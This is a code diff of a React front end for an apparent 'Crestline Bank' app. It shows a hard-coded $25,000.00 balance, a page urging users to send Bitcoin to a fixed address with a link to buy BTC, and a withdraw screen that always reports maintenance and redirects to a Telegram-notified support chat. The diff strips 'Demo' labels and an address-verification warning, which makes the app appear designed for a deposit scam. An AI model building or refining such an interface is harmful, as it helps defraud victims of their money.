@@ -25,12 +25,12 @@ function App() {
   const [sendingMessage, setSendingMessage] = useState(false)
   const [messages, setMessages] = useState([])
 
-  // Wallet / Withdraw
+  // Wallet / Withdraw pages
   const [showWallet, setShowWallet] = useState(false)
   const [showWithdraw, setShowWithdraw] = useState(false)
-  const [copied, setCopied] = useState(false)
 
-  const bitcoinAddress =
+  // Your demo BTC wallet address
+  const walletAddress =
     'bc1qwx90w9s588gyev4qrw45fe57gq5pwrhctte8f2'
 
   // --------------------------------------------------
@@ -370,7 +370,7 @@ function App() {
       )
     )
 
-    // Send Telegram notification
+    // Telegram notification
     try {
       const {
         error: telegramError,
@@ -404,69 +404,6 @@ function App() {
   }
 
   // --------------------------------------------------
-  // OPEN / CLOSE SUPPORT
-  // --------------------------------------------------
-
-  function openSupport() {
-    setShowSupport(true)
-    setShowWallet(false)
-    setShowWithdraw(false)
-    loadMessages()
-  }
-
-  function closeSupport() {
-    setShowSupport(false)
-  }
-
-  // --------------------------------------------------
-  // WALLET
-  // --------------------------------------------------
-
-  function openWallet() {
-    setShowWallet(true)
-    setShowSupport(false)
-    setShowWithdraw(false)
-  }
-
-  function closeWallet() {
-    setShowWallet(false)
-    setCopied(false)
-  }
-
-  async function copyBitcoinAddress() {
-    try {
-      await navigator.clipboard.writeText(
-        bitcoinAddress
-      )
-
-      setCopied(true)
-
-      setTimeout(() => {
-        setCopied(false)
-      }, 2000)
-    } catch (error) {
-      console.error(
-        'Could not copy address:',
-        error
-      )
-    }
-  }
-
-  // --------------------------------------------------
-  // WITHDRAW
-  // --------------------------------------------------
-
-  function openWithdraw() {
-    setShowWithdraw(true)
-    setShowWallet(false)
-    setShowSupport(false)
-  }
-
-  function closeWithdraw() {
-    setShowWithdraw(false)
-  }
-
-  // --------------------------------------------------
   // SUPPORT SCREEN
   // --------------------------------------------------
 
@@ -479,7 +416,7 @@ function App() {
           <button
             type="button"
             className="back-button"
-            onClick={closeSupport}
+            onClick={() => setShowSupport(false)}
           >
             ←
           </button>
@@ -587,9 +524,9 @@ function App() {
 
             <textarea
               value={supportMessage}
-              onChange={(e) => {
+              onChange={(e) =>
                 setSupportMessage(e.target.value)
-              }}
+              }
               placeholder="Type a message..."
               rows={1}
               disabled={sendingMessage}
@@ -633,17 +570,239 @@ function App() {
   }
 
   // --------------------------------------------------
+  // WALLET SCREEN
+  // --------------------------------------------------
+
+  function WalletBox() {
+
+    async function copyWalletAddress() {
+      try {
+        await navigator.clipboard.writeText(
+          walletAddress
+        )
+
+        alert('Wallet address copied!')
+      } catch (error) {
+        console.error(
+          'Copy failed:',
+          error
+        )
+
+        alert(
+          'Unable to copy automatically. Please copy the address manually.'
+        )
+      }
+    }
+
+    return (
+      <div className="messages-page wallet-page">
+
+        <div className="messages-header">
+
+          <button
+            type="button"
+            className="back-button"
+            onClick={() => setShowWallet(false)}
+          >
+            ←
+          </button>
+
+          <div className="support-avatar">
+            ₿
+          </div>
+
+          <div className="messages-title">
+
+            <strong>
+              Bitcoin Wallet
+            </strong>
+
+            <span>
+              BTC
+            </span>
+
+          </div>
+
+        </div>
+
+        <div className="wallet-content">
+
+          <div className="wallet-icon">
+            ₿
+          </div>
+
+          <h1>
+            Your Bitcoin Wallet
+          </h1>
+
+          <p className="wallet-description">
+            This is your  Bitcoin wallet address.
+          </p>
+
+          <div className="wallet-address-card">
+
+            <p className="wallet-address-label">
+              BTC Wallet Address
+            </p>
+
+            <div className="wallet-address">
+              {walletAddress}
+            </div>
+
+            <button
+              type="button"
+              className="card-button copy-wallet-button"
+              onClick={copyWalletAddress}
+            >
+              📋 Copy Address
+            </button>
+
+          </div>
+
+          <div className="wallet-info">
+
+            <strong>
+              Important
+            </strong>
+
+            <p>
+              Only send Bitcoin (BTC) to this
+              Bitcoin address. This  wallet
+              process  banking
+              transactions.
+            </p>
+
+          </div>
+
+          <a
+            className="card-button changelly-button"
+            href="https://changelly.com/buy/btc"
+            target="_blank"
+            rel="noopener noreferrer"
+          >
+            ₿ Buy Bitcoin with Changelly
+          </a>
+
+          <button
+            type="button"
+            className="wallet-back-button"
+            onClick={() => setShowWallet(false)}
+          >
+            ← Back to Account
+          </button>
+
+        </div>
+
+      </div>
+    )
+  }
+
+  // --------------------------------------------------
+  // WITHDRAW SCREEN
+  // --------------------------------------------------
+
+  function WithdrawBox() {
+    return (
+      <div className="messages-page">
+
+        <div className="messages-header">
+
+          <button
+            type="button"
+            className="back-button"
+            onClick={() => setShowWithdraw(false)}
+          >
+            ←
+          </button>
+
+          <div className="support-avatar">
+            $
+          </div>
+
+          <div className="messages-title">
+
+            <strong>
+              Withdraw
+            </strong>
+
+            <span>
+              Account Services
+            </span>
+
+          </div>
+
+        </div>
+
+        <div className="withdraw-content">
+
+          <div className="withdraw-icon">
+            🔧
+          </div>
+
+          <h1>
+            Withdraw Unavailable
+          </h1>
+
+          <p>
+            This service is currently unavailable
+            because the site is undergoing maintenance.
+          </p>
+
+          <div className="maintenance-box">
+
+            <strong>
+              Site Maintenance
+            </strong>
+
+            <p>
+              Please try again later or contact
+              Customer Support if you need assistance.
+            </p>
+
+          </div>
+
+          <button
+            type="button"
+            className="card-button"
+            onClick={() => {
+              setShowWithdraw(false)
+              setShowSupport(true)
+              loadMessages()
+            }}
+          >
+            💬 Contact Customer Support
+          </button>
+
+          <button
+            type="button"
+            className="wallet-back-button"
+            onClick={() => setShowWithdraw(false)}
+          >
+            ← Back to Account
+          </button>
+
+        </div>
+
+      </div>
+    )
+  }
+
+  // --------------------------------------------------
   // LOADING
   // --------------------------------------------------
 
   if (loading) {
     return (
       <div className="app">
+
         <div className="login-card">
+
           <h1>
             Loading...
           </h1>
+
         </div>
+
       </div>
     )
   }
@@ -653,6 +812,7 @@ function App() {
   // --------------------------------------------------
 
   if (!session) {
+
     const isLogin =
       authMode === 'login'
 
@@ -808,7 +968,7 @@ function App() {
             </span>
 
             <span>
-              Crestline Bank 
+            Crestline Bank
             </span>
 
           </div>
@@ -824,9 +984,12 @@ function App() {
   // --------------------------------------------------
 
   if (checkingApproval) {
+
     return (
       <div className="app">
+
         <div className="login-card">
+
           <h1>
             Please wait...
           </h1>
@@ -834,7 +997,9 @@ function App() {
           <p className="subtitle">
             Checking your account approval.
           </p>
+
         </div>
+
       </div>
     )
   }
@@ -844,6 +1009,7 @@ function App() {
   // --------------------------------------------------
 
   if (!approved) {
+
     return (
       <div className="app">
 
@@ -882,6 +1048,42 @@ function App() {
   }
 
   // --------------------------------------------------
+  // WALLET PAGE
+  // --------------------------------------------------
+
+  if (showWallet) {
+    return (
+      <div className="dashboard">
+        {WalletBox()}
+      </div>
+    )
+  }
+
+  // --------------------------------------------------
+  // WITHDRAW PAGE
+  // --------------------------------------------------
+
+  if (showWithdraw) {
+    return (
+      <div className="dashboard">
+        {WithdrawBox()}
+      </div>
+    )
+  }
+
+  // --------------------------------------------------
+  // SUPPORT PAGE
+  // --------------------------------------------------
+
+  if (showSupport) {
+    return (
+      <div className="dashboard">
+        {SupportBox()}
+      </div>
+    )
+  }
+
+  // --------------------------------------------------
   // DASHBOARD
   // --------------------------------------------------
 
@@ -898,7 +1100,8 @@ function App() {
         <div>
 
           <div className="brand">
-            ◆ Crestline Bank
+            ◆Crestline Bank
+
           </div>
 
           <span>
@@ -931,26 +1134,16 @@ function App() {
 
         <section className="balance-card">
 
-          <p
-            style={{
-              color: '#ffffff',
-              fontWeight: 800,
-            }}
-          >
+          <p>
             Available Balance
           </p>
 
-          <h2
-            style={{
-              color: '#ffffff',
-              fontWeight: 900,
-            }}
-          >
+          <h2>
             $25,000.00
           </h2>
 
           <span>
-            Demo balance
+             balance
           </span>
 
         </section>
@@ -971,7 +1164,10 @@ function App() {
 
             <button
               type="button"
-              onClick={openSupport}
+              onClick={() => {
+                setShowSupport(true)
+                loadMessages()
+              }}
               className="card-button"
             >
               Messages
@@ -988,13 +1184,13 @@ function App() {
             </h3>
 
             <p>
-              View your  BTC wallet address.
+              View your BTC wallet address.
             </p>
 
             <button
-              className="card-button"
               type="button"
-              onClick={openWallet}
+              onClick={() => setShowWallet(true)}
+              className="card-button"
             >
               Open Wallet
             </button>
@@ -1010,13 +1206,13 @@ function App() {
             </h3>
 
             <p>
-              Withdraw funds from your  account.
+              Withdraw funds from your account.
             </p>
 
             <button
-              className="card-button"
               type="button"
-              onClick={openWithdraw}
+              onClick={() => setShowWithdraw(true)}
+              className="card-button"
             >
               Withdraw
             </button>
@@ -1028,7 +1224,7 @@ function App() {
         <div className="demo-notice">
 
           <strong>
-             Personal Account
+            Crestline Bank
           </strong>
 
           <p>
@@ -1040,135 +1236,6 @@ function App() {
         </div>
 
       </main>
-
-      {/* --------------------------------------------------
-          WALLET MODAL
-      -------------------------------------------------- */}
-
-      {showWallet && (
-        <div className="modal-overlay">
-
-          <div className="modal-card">
-
-            <button
-              type="button"
-              className="modal-close"
-              onClick={closeWallet}
-              aria-label="Close wallet"
-            >
-              ×
-            </button>
-
-            <div className="wallet-icon">
-              ₿
-            </div>
-
-            <h2>
-              Bitcoin Wallet
-            </h2>
-
-            <p>
-              Your  Bitcoin wallet address
-            </p>
-
-            <div className="wallet-address-box">
-              <span>
-                {bitcoinAddress}
-              </span>
-            </div>
-
-            <button
-              type="button"
-              className="card-button"
-              onClick={copyBitcoinAddress}
-            >
-              {copied
-                ? '✓ Address Copied'
-                : 'Copy Address'}
-            </button>
-
-            <a
-              href="https://changelly.com/buy-crypto"
-              target="_blank"
-              rel="noopener noreferrer"
-              className="card-button buy-crypto-button"
-            >
-              Buy Crypto on Changelly
-            </a>
-
-            <p className="wallet-demo-note">
-               wallet address only. Always verify
-              the cryptocurrency network and address
-              before sending any  funds.
-            </p>
-
-          </div>
-
-        </div>
-      )}
-
-      {/* --------------------------------------------------
-          WITHDRAW MODAL
-      -------------------------------------------------- */}
-
-      {showWithdraw && (
-        <div className="modal-overlay">
-
-          <div className="modal-card">
-
-            <button
-              type="button"
-              className="modal-close"
-              onClick={closeWithdraw}
-              aria-label="Close withdrawal message"
-            >
-              ×
-            </button>
-
-            <div className="maintenance-icon">
-              🔧
-            </div>
-
-            <h2>
-              Withdrawals Unavailable
-            </h2>
-
-            <p className="withdraw-message">
-              Withdrawals are currently unavailable
-              because the site is undergoing maintenance.
-              Please try again later or contact Customer
-              Support for assistance.
-            </p>
-
-            <button
-              type="button"
-              className="card-button"
-              onClick={() => {
-                closeWithdraw()
-                openSupport()
-              }}
-            >
-              Contact Customer Support
-            </button>
-
-            <button
-              type="button"
-              className="secondary-button"
-              onClick={closeWithdraw}
-            >
-              Close
-            </button>
-
-          </div>
-
-        </div>
-      )}
-
-      {/* --------------------------------------------------
-          CUSTOMER SUPPORT
-      -------------------------------------------------- */}
-
-      {showSupport && SupportBox()}
 
     </div>
   )
